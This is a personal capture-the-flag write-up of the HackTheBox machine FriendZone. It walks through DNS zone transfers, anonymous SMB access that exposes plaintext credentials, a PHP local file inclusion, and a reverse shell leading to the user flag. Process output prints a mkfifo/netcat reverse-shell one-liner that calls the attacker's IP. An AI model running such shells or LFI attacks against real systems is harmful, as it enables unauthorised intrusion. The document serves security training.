# [23 - FriendZone](https://app.hackthebox.com/machines/FriendZone)

![FriendZone.png](FriendZone.png)

## description
> 10.10.10.123

## walkthrough

### recon

```
$ nmap -sC -sV -A -Pn -p- friendzone.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-04 09:27 MDT
Nmap scan report for friendzone.htb (10.10.10.123)
Host is up (0.059s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/ssl     Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: FRIENDZONE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-09-04T15:28:40
|_  start_date: N/A

```

more ftp, dns, https and smb

### 80

as usual, waiting for nmap, looking at 80

```
Have you ever been friendzoned?
<image>
if yes, try to get out of this zone ;)
Call us at : +999999999
Email us at: info@friendzoneportal.red
```

looks like another domain/vhost, but content comes back the same

```
$ gobuster dir -u http://friendzone.htb -r -t 40 -w ~/git/ctf/tools/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://friendzone.htb
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /home/conor/git/ctf/tools/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2022/09/04 09:31:51 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 298]
/.hta                 (Status: 403) [Size: 293]
/.htpasswd            (Status: 403) [Size: 298]
/index.html           (Status: 200) [Size: 324]
/robots.txt           (Status: 200) [Size: 13]
/server-status        (Status: 403) [Size: 302]
/wordpress            (Status: 200) [Size: 749]


```

wordpress looks interesting, but there is no content

### 53

trying dnsenum here

```
$ dnsenum --dnsserver 10.10.10.123 --enum friendzone.htb -r
dnsenum VERSION:1.2.6

-----   friendzone.htb   -----


Host's addresses:
__________________



Name Servers:
______________

 friendzone.htb NS record query failed: REFUSED
```

no love, trying the other domain

```
$ dnsenum --dnsserver 10.10.10.123 --enum friendzoneportal.red -r
dnsenum VERSION:1.2.6

-----   friendzoneportal.red   -----


Host's addresses:
__________________

friendzoneportal.red.                    604800   IN    A         127.0.0.1


Name Servers:
______________

localhost.                               604800   IN    A         127.0.0.1


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________


Trying Zone Transfer for friendzoneportal.red on localhost ...
AXFR record query failed: Connection timed out


Scraping friendzoneportal.red subdomains from Google:
______________________________________________________


 ----   Google search page: 1   ----



Google Results:
________________

  perhaps Google is blocking our queries.
 Check manually.


Brute forcing with /usr/share/dnsenum/dns.txt:
_______________________________________________

admin.friendzoneportal.red.              604800   IN    A         127.0.0.1
vpn.friendzoneportal.red.                604800   IN    A         127.0.0.1

Performing recursion:
______________________


 ---- Checking subdomains NS records ----

  Can't perform recursion no NS records.


Launching Whois Queries:
_________________________



friendzoneportal.red____________________



Performing reverse lookup on 0 ip addresses:
_____________________________________________


0 results out of 0 IP addresses.


friendzoneportal.red ip blocks:
________________________________
```

2 new domains, `admin.friendzoneportal.red` and `vpn.friendzoneportal.red`

### admin.friendzoneportal.red

```
$ curl http://admin.friendzoneportal.red
<html><head><title>Loading...</title></head><body><script type='text/javascript'>window.location.replace('http://admin.friendzoneportal.red/?js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJKb2tlbiIsImV4cCI6MTY2MjMxODQ3NywiaWF0IjoxNjYyMzExMjc3LCJpc3MiOiJKb2tlbiIsImpzIjoxLCJqdGkiOiIyczhyZWo1dXM0MmxsbjFyMG8wZzYzNDkiLCJuYmYiOjE2NjIzMTEyNzcsInRzIjoxNjYyMzExMjc3NzI0MTU0fQ.1ai50VW-lErFazbopTEuRw4DN6QoqoiVunSWCGXqlws&sid=1fa60988-2c74-11ed-b262-46a033f930b2');</script></body></html>
```

that js turns is a JWT when decoded, but when requesting, we get 301'd to `ww1.friendzoneportal.red`, which is a domain squat

same for `vpn.friendzoneportal.red`

```
$ gobuster dns -d friendzoneportal.red -r friendzone.htb -w ~/git/ctf/tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     friendzoneportal.red
[+] Threads:    10
[+] Resolver:   friendzone.htb
[+] Timeout:    1s
[+] Wordlist:   /home/conor/git/ctf/tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
2022/09/04 11:13:44 Starting gobuster in DNS enumeration mode
===============================================================
Found: admin.friendzoneportal.red
Found: vpn.friendzoneportal.red
Found: files.friendzoneportal.red
```

but, same for `files.friendzoneportal.red`

### 443

```
$ curl -k https://friendzone.htb
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL / was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at friendzone.htb Port 443</address>
</body></html>
```

gobuster here didn't find anything

### 445

```
$ smbclient --no-pass -L friendzone.htb

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```
$ smbclient -U '%' -N \\\\friendzone.htb\\Files
tree connect failed: NT_STATUS_ACCESS_DENIED
$ smbclient -U '%' -N \\\\friendzone.htb\\general
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup
blocksize      cancel         case_sensitive cd             chmod
chown          close          del            deltree        dir
du             echo           exit           get            getfacl
geteas         hardlink       help           history        iosize
lcd            link           lock           lowercase      ls
l              mask           md             mget           mkdir
more           mput           newer          notify         open
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir
posix_unlink   posix_whoami   print          prompt         put
pwd            q              queue          quit           readlink
rd             recurse        reget          rename         reput
rm             rmdir          showacls       setea          setmode
scopy          stat           symlink        tar            tarmode
timeout        translate      unlock         volume         vuid
wdel           logon          listconnect    showconnect    tcon
tdis           tid            utimes         logoff         ..
!
smb: \> ls
  .                                   D        0  Wed Jan 16 13:10:51 2019
  ..                                  D        0  Wed Jan 23 14:51:02 2019
  creds.txt                           N       57  Tue Oct  9 17:52:42 2018

                9221460 blocks of size 1024. 6456952 blocks available
smb: \> cat creds.txt
cat: command not found
smb: \> more creds.txt
getting file \creds.txt of size 57 as /tmp/smbmore.OuZkv7 (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

```
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

ok, so some creds - thinking it could be for admin.friendzoneportal.red, but maybe smb?

```
$ smbclient -U '%' -N \\\\friendzone.htb\\Development
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 13:03:49 2019
  ..                                  D        0  Wed Jan 23 14:51:02 2019

                9221460 blocks of size 1024. 6456952 blocks available
```

hmm.

```
$ smbclient //friendzone.htb/general -U admin -c id
Password for [WORKGROUP\admin]:
id: command not found
$ smbclient //friendzone.htb/general -U admin -c w
Password for [WORKGROUP\admin]:
wdel 0x<attrib> <wcard>
$ smbclient //friendzone.htb/general --no-pass -c w
wdel 0x<attrib> <wcard>
```

ok, so these creds are not important for SMB

### back to 53

```
$ dig axfr 10.10.10.123 @10.10.10.123

; <<>> DiG 9.18.1-1ubuntu1.1-Ubuntu <<>> axfr 10.10.10.123 @10.10.10.123
;; global options: +cmd
; Transfer failed.
```

was hopeful that would give us some new targets, especially thinking about
> if yes, try to get out of this zone ;)

specifically `zone`

```
Nmap scan report for friendzone.htb (10.10.10.123)
Host is up (0.055s latency).
Not shown: 997 closed ports
PORT    STATE         SERVICE
53/udp  open          domain
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm
...
$ sudo nmap -sUV -T4 -p 53,137,138 friendzone.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-05 08:31 MDT
Nmap scan report for friendzone.htb (10.10.10.123)
Host is up (0.058s latency).

PORT    STATE         SERVICE     VERSION
53/udp  open          domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
137/udp open          netbios-ns  Samba nmbd netbios-ns (workgroup: WORKGROUP)
138/udp open|filtered netbios-dgm
Service Info: Host: FRIENDZONE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
$ dig axfr @10.10.10.123 friendzone.htb

; <<>> DiG 9.18.1-1ubuntu1.1-Ubuntu <<>> axfr @10.10.10.123 friendzone.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
...

$ dig axfr @10.10.10.123 friendzoneportal.red

; <<>> DiG 9.18.1-1ubuntu1.1-Ubuntu <<>> axfr @10.10.10.123 friendzoneportal.red
; (1 server found)
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 55 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Mon Sep 05 08:35:51 MDT 2022
;; XFR size: 9 records (messages 1, bytes 309)
```

imports.friendzoneportal.red is new

while adding this to /etc/hosts, saw that none of the subdomains had been added.. and sure enough `https://admin.friendzoneportal.red` actually gives us a username/password login.

### admin.friendzoneportal.red

logging in with the creds above does give us a 200, but
> Admin page is not developed yet !!! check for another one


curl'ing that gives us another domain

```
* Server certificate:
*  subject: C=JO; ST=CODERED; L=AMMAN; O=CODERED; OU=CODERED; CN=friendzone.red; emailAddress=haha@friendzone.red
*  start date: Oct  5 21:02:30 2018 GMT
*  expire date: Nov  4 21:02:30 2018 GMT
*  issuer: C=JO; ST=CODERED; L=AMMAN; O=CODERED; OU=CODERED; CN=friendzone.red; emailAddress=haha@friendzone.red
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
* TLSv1.2 (OUT), TLS header, Supplemental data (23):
> GET /login.php HTTP/1.1
> Host: admin.friendzoneportal.red
> User-Agent: curl/7.81.0
> Accept: */*
```

`friendzone.red`

```
$ curl -k https://friendzone.red
<title>FriendZone escape software</title>

<br>
<br>


<center><h2>Ready to escape from friend zone !</h2></center>


<center><img src="e.gif"></center>

<!-- Just doing some development here -->
<!-- /js/js -->
<!-- Don't go deep ;) -->
```
```
$ curl -k https://friendzone.red/js/js/
<p>Testing some functions !</p><p>I'am trying not to break things !</p>WnA2bmFSRVN0VzE2NjIzODkxOTJjWUtXMjBRMVFo<!-- dont stare too much , you will be smashed ! , it's all about times and zon
es ! -->
```

so b64, but..

```
irb(main):001:0> require 'base64' #=> true
irb(main):002:0> a = 'WnA2bmFSRVN0VzE2NjIzODkxOTJjWUtXMjBRMVFo'
irb(main):003:0> b = Base64.decode64(a)
irb(main):004:0> b #=> "Zp6naREStW1662389192cYKW20Q1Qh"
irb(main):005:0> c = Base64.decode64(b)
irb(main):006:0> c #=> "f\x9E\xA7i\x11\x12\xB5mz\xEBm\xFC\xF7_vq\x82\x96\xDBD5B"
```

only other thing in the request is
```
Set-Cookie: zonedman=justgotzoned; expires=Mon, 05-Sep-2022 20:46:23 GMT; Max-Age=3600
```

that feels like it could be a password of some sort?

```
$ gobuster dir -k -u https://friendzone.red -r -t 40 -w ~/git/ctf/tools/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
/admin                (Status: 200) [Size: 742]
/js                   (Status: 200) [Size: 922]
/server-status        (Status: 403) [Size: 303]
```

not the admin we're looking for, it's 404.. oi.

```
irb(main):001:0> a = 'WnA2bmFSRVN0VzE2NjIzODkxOTJjWUtXMjBRMVFo'
irb(main):002:0> a.freeze   #=> "WnA2bmFSRVN0VzE2NjIzODkxOTJjWUtXMjBRMVFo"
irb(main):003:0> a.size   #=> 40
irb(main):004:0> require 'base64' #=> true
irb(main):005:0> b = Base64.decode64(a)
irb(main):007:0> b #=> "Zp6naREStW1662389192cYKW20Q1Qh"
irb(main):008:0> b.size   #=> 30
irb(main):009:0> c = Base64.decode64(b)
irb(main):010:0> c #=> "f\x9E\xA7i\x11\x12\xB5mz\xEBm\xFC\xF7_vq\x82\x96\xDBD5B"
irb(main):011:0> c.size   #=> 22
irb(main):012:0> d = Base64.decode64(c)
irb(main):013:0> d #=> "~)\xB3\x9A\xFA\x83\xE4"
irb(main):014:0> d.size   #=> 7
irb(main):015:0>
```

feels like `b` is the hash we need to attack
  * base64 - no, hex and not magic
  * base32 - no, `p` is invalid
  * base85 - no, missing header
  * base91 - no, hex and not magic
  * encryption? with `zonedman` or `justgotzoned` as a key?
    * vigenere gives us `Qv6vhLQZuI1662389192pUHN20W1Yo` with `JUSTGOTZONED` and `Ab6awOSSgX1662389192oLGT20E1Qu` with `ZONEDMAN`

it's definitely encryption - and it looks like the value of the `zonedman` cookie is the salt or the key:

sending `zonedman=f` instead, got `R2Z0enhmQTltVzE2NjI0MTAzMzlzdUtDN3FlUjJ5`
sending `zonedman=f` again.. got  `RU5QWDVxYWZKbDE2NjI0MTA0MTdKdkUzRk5PYXhw`.. wait.

it's not the `zonedman` value, it's the time. convert the time to an int and use that as IV?


`zonedman=justgotzoned`:
```
HTTP/1.1 200 OK
Date: Mon, 05 Sep 2022 20:40:44 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: zonedman=justgotzoned; expires=Mon, 05-Sep-2022 21:40:44 GMT; Max-Age=3600
Vary: Accept-Encoding
Content-Length: 198
Connection: close
Content-Type: text/html; charset=UTF-8

<p>Testing some functions !</p><p>I'am trying not to break things !</p>
T0lNRlhxdzR6STE2NjI0MTA0NDQxTTk2TXJsaVhi<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->
```

```
irb(main):012:0> a = Time.parse('Mon, 05 Sep 2022 20:40:44 GMT')
irb(main):013:0> a.to_i   #=> 1662410444
```

can't be AES, since the key isn't 16 bytes

### coming back

```
$ dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.18.1-1ubuntu1.2-Ubuntu <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 59 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Tue Feb 28 19:19:33 MST 2023
;; XFR size: 8 records (messages 1, bytes 289)

```

GETting the https version of `administrator1.friendzone.red` gives us another login form - same creds?

same creds.

```
HTTP/1.1 200 OK
Date: Wed, 01 Mar 2023 02:23:07 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; expires=Fri, 31-Mar-2023 02:23:07 GMT; Max-Age=2592000
Content-Length: 33
Connection: close
Content-Type: text/html; charset=UTF-8

Login Done ! visit /dashboard.php
```

> Smart photo script for friendzone corp !
> * Note : we are dealing with a beginner php developer and the application is not tested yet !
> image_name param is missed !
> please enter it to show the image
> default is image_id=a.jpg&pagename=timestamp

looks like an LFI opportunity

```
$ curl -k -X POST https://administrator1.friendzone.red/dashboard.php -d 'image_id=a.jpg&pagename=timestamp'
<title>FriendZone Admin !</title><center><p>You can't see the content ! , please login !</center></p>
$ curl -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -k -X POST https://administrator1.friendzone.red/dashboard.php -d 'image_id=a.jpg&pagename=timestamp'
<title>FriendZone Admin !</title><br><br><br><center><h2>Smart photo script for friendzone corp !</h2></center><center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center><br><br><center><p>image_name param is missed !</p></center><center><p>please enter it to show the image</p></center><center><p>default is image_id=a.jpg&pagename=timestamp</p></center>
$ curl -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -k -X POST 'https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp'
<title>FriendZone Admin !</title><br><br><br><center><h2>Smart photo script for friendzone corp !</h2></center><center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center><center><img src='images/a.jpg'></center><center><h1>Something went worng ! , the script include wrong param !</h1></center>Final Access timestamp is 1677641160
```

ok, finally got it.

what's with the `Final Access timestamp is <ctime>`?

```
irb(main):002:0> Time.at(1677641160)   #=> 2023-02-28 20:26:00 -0700
irb(main):003:0> Time.now              #=> 2023-02-28 19:31:45.504572479 -0700
```

ok, so we're ~125 minutes off

.. timestamp?

```
$ curl -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -k https://administrator1.friendzone.red/timestamp.php
Final Access timestamp is 1677641769
```

ok - _that_ is LFI

change `pagename=timestamp` to .. what?

### back again

```
$ curl -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -k -X POST 'https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../uploads/upload.php'
<title>FriendZone Admin !</title><br><br><br><center><h2>Smart photo script for friendzone corp !</h2></center><center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center><center><img src='images/a.jpg'></center><center><h1>Something went worng ! , the script include wrong param !</h1></center>
```

different than

```
$ curl -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -k -X POST 'https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../uploads/upload'
<title>FriendZone Admin !</title><br><br><br><center><h2>Smart photo script for friendzone corp !</h2></center><center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center><center><img src='images/a.jpg'></center><center><h1>Something went worng ! , the script include wrong param !</h1></center>WHAT ARE YOU TRYING TO DO HOOOOOOMAN !
```

keep saying "the script include wrong param", but `default is image_id=a.jpg&pagename=timestamp` and that's what we're sending


### after a lot of shenanigans

see [lfi.rb](lfi.rb), finally get to

```
$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on friendzone.htb 43122
/bin/sh: 0: can't access tty; job control turned off
$ id -a
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www/admin
$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Sep 13  2022 .
drwxr-xr-x 8 root root 4096 Sep 13  2022 ..
-rw-r--r-- 1 root root 1169 Jan 16  2019 dashboard.php
drwxr-xr-x 2 root root 4096 Sep 13  2022 images
-rw-r--r-- 1 root root 2873 Oct  6  2018 index.html
-rw-r--r-- 1 root root  384 Oct  7  2018 login.php
-rw-r--r-- 1 root root   89 Oct  7  2018 timestamp.php
$ ls images
a.jpg
b.jpg
$ cd ..
$ ls -la
total 36
drwxr-xr-x  8 root root 4096 Sep 13  2022 .
drwxr-xr-x 12 root root 4096 Sep 13  2022 ..
drwxr-xr-x  3 root root 4096 Sep 13  2022 admin
drwxr-xr-x  4 root root 4096 Sep 13  2022 friendzone
drwxr-xr-x  2 root root 4096 Sep 13  2022 friendzoneportal
drwxr-xr-x  2 root root 4096 Sep 13  2022 friendzoneportaladmin
drwxr-xr-x  3 root root 4096 Sep 13  2022 html
-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
drwxr-xr-x  3 root root 4096 Sep 13  2022 uploads
$ cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
$
```

```
$ ls /home
total 12
drwxr-xr-x  3 root   root   4096 Sep 13  2022 .
drwxr-xr-x 22 root   root   4096 Sep 13  2022 ..
drwxr-xr-x  5 friend friend 4096 Sep 13  2022 friend
$ ls /home/friend
total 36
drwxr-xr-x 5 friend friend 4096 Sep 13  2022 .
drwxr-xr-x 3 root   root   4096 Sep 13  2022 ..
lrwxrwxrwx 1 root   root      9 Jan 24  2019 .bash_history -> /dev/null
-rw-r--r-- 1 friend friend  220 Oct  5  2018 .bash_logout
-rw-r--r-- 1 friend friend 3771 Oct  5  2018 .bashrc
drwx------ 2 friend friend 4096 Sep 13  2022 .cache
drwx------ 3 friend friend 4096 Sep 13  2022 .gnupg
drwxrwxr-x 3 friend friend 4096 Sep 13  2022 .local
-rw-r--r-- 1 friend friend  807 Oct  5  2018 .profile
-r--r--r-- 1 root   root     33 Mar 18 16:38 user.txt
$ cat /home/friend/user.txt
8c9f0ef0d7eaf8a6f5fafae813b6f8bc
```

user down!

but now it's not clear if we even need to pop `friend` before we get to root

also not clear whether there is actually a mysql db running. kicking linpeas to take care of some of this

### working it out

```
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root          1  0.0  0.9 159568  8936 ?        Ss   Mar18   0:03 /sbin/init splash
root        217  0.1  1.2 201392 11276 ?        Ssl  Mar18   0:31 /usr/bin/vmtoolsd
root        234  0.0  1.5  95152 14476 ?        S<s  Mar18   0:00 /lib/systemd/systemd-journald
root        247  0.0  0.4  45064  3952 ?        Ss   Mar18   0:00 /lib/systemd/systemd-udevd
systemd+    362  0.0  0.5  70612  5180 ?        Ss   Mar18   0:03 /lib/systemd/systemd-resolved
systemd+    363  0.0  0.3 141912  3224 ?        Ssl  Mar18   0:02 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root        448  0.0  0.7 287540  6880 ?        Ssl  Mar18   0:00 /usr/lib/accountsservice/accounts-daemon[0m
message+    452  0.0  0.4  49928  4344 ?        Ss   Mar18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root        494  0.0  0.3  31320  3196 ?        Ss   Mar18   0:00 /usr/sbin/cron -f
root        495  0.0  0.6  62004  5676 ?        Ss   Mar18   0:00 /lib/systemd/systemd-logind
syslog      499  0.0  0.5 263036  4892 ?        Ssl  Mar18   0:00 /usr/sbin/rsyslogd -n
root        500  0.0  1.8 170408 17204 ?        Ssl  Mar18   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root        501  0.0  1.1  87740 10196 ?        Ss   Mar18   0:00 /usr/bin/VGAuthService
root        570  0.0  1.3 265344 12412 ?        Ss   Mar18   0:00 /usr/sbin/nmbd --foreground --no-process-group
bind        571  0.0  2.1 216300 20136 ?        Ssl  Mar18   0:02 /usr/sbin/named -f -4 -u bind
  └─(Caps) 0x0000000001000400=cap_net_bind_service,cap_sys_resource
root        593  0.0  0.2  28676  2736 ?        Ss   Mar18   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root        594  0.0  0.6  72296  5636 ?        Ss   Mar18   0:00 /usr/sbin/sshd -D
root        657  0.0  0.2  16180  1988 tty1     Ss+  Mar18   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root        890  0.0  2.0 331712 19168 ?        Ss   Mar18   0:01 /usr/sbin/apache2 -k start
www-data    894  0.0  1.8 336588 17404 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
www-data   1705  0.0  0.0   4628   856 ?        S    Mar18   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444>/tmp/f
www-data   1708  0.0  0.0   4672   732 ?        S    Mar18   0:00  |       _ cat /tmp/f
www-data   1709  0.0  0.0   4628   776 ?        S    Mar18   0:00  |       _ /bin/sh -i
www-data   1710  0.0  0.2  15716  2100 ?        S    Mar18   0:00  |       _ nc 10.10.14.3 4444
www-data    895  0.0  1.9 336580 18088 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
www-data    896  0.0  1.9 336580 18288 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
www-data    897  0.0  1.9 336580 17756 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
www-data    898  0.0  1.8 336652 17436 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
www-data   1691  0.0  0.0   4628   804 ?        S    Mar18   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444>/tmp/f
www-data   1694  0.0  0.0   4672   768 ?        S    Mar18   0:00  |       _ cat /tmp/f
www-data   1695  0.0  0.1   4628  1704 ?        S    Mar18   0:00  |       _ /bin/sh -i
www-data   2993  0.9  0.5  20276  5072 ?        S    01:09   0:00  |       |   _ bash linpeas.sh
www-data   6002  0.0  0.4  20276  3692 ?        S    01:09   0:00  |       |       _ bash linpeas.sh
www-data   6006  0.0  0.3  36840  3268 ?        R    01:09   0:00  |       |       |   _ ps fauxwww
www-data   6005  0.0  0.2  20276  2268 ?        S    01:09   0:00  |       |       _ bash linpeas.sh
www-data   1696  0.0  0.2  15716  2100 ?        S    Mar18   0:00  |       _ nc 10.10.14.3 4444
www-data   1057  0.0  1.8 336644 17460 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
www-data   1711  0.0  1.2 336116 11160 ?        S    Mar18   0:00  _ /usr/sbin/apache2 -k start
root        902  0.0  2.2 357068 20576 ?        Ss   Mar18   0:00 /usr/sbin/smbd --foreground --no-process-group
root        906  0.0  0.6 345028  6028 ?        S    Mar18   0:00  _ /usr/sbin/smbd --foreground --no-process-group
root        907  0.0  0.5 345052  4672 ?        S    Mar18   0:00  _ /usr/sbin/smbd --foreground --no-process-group
root        909  0.0  0.7 357052  6920 ?        S    Mar18   0:00  _ /usr/sbin/smbd --foreground --no-process-group
Debian-+    903  0.0  0.5  65648  4896 ?        Ss   Mar18   0:00 /usr/sbin/exim4 -bd -q30m

...

tcp        0      0 10.10.10.123:53         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:25                  :::*                    LISTEN      -
tcp6       0      0 :::445                  :::*                    LISTEN      -
tcp6       0      0 :::139                  :::*                    LISTEN      -


...

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/Development
/etc/Development/cmd.php
/etc/sambafiles
/run/lock
/run/lock/apache2
/tmp
/tmp/linpeas.sh
/usr/lib/python2.7
/usr/lib/python2.7/os.py
